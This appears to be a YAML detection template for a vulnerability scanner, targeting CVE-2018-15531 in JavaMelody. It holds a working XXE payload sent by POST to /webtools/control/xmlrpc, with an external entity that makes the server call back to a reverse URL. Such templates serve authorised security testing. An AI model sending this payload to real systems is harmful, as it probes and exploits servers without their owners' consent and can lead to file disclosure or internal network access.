name: poc-yaml-javamelody-cve-2018-15531
manual: true
transport: http
rules:
    javamelody:
        request:
            cache: true
            method: GET
            path: /monitoring
        expression: response.status == 200 && response.body.bcontains(b"JavaMelody")
    xxe:
        request:
            cache: true
            method: POST
            path: /webtools/control/xmlrpc
            headers:
                Content-Type: application/xml
            body: <?xml version="1.0" encoding="UTF-8" standalone="no" ?><!DOCTYPE root [<!ENTITY % remote SYSTEM "{{reverseURL}}">%remote;]></root>
        expression: reverse.wait(5)
expression: javamelody() && xxe()
detail:
    author: secbug
    links:
        - https://mp.weixin.qq.com/s/ye9qWPm0wcn90zoKQpExGg
        - https://paper.seebug.org/705/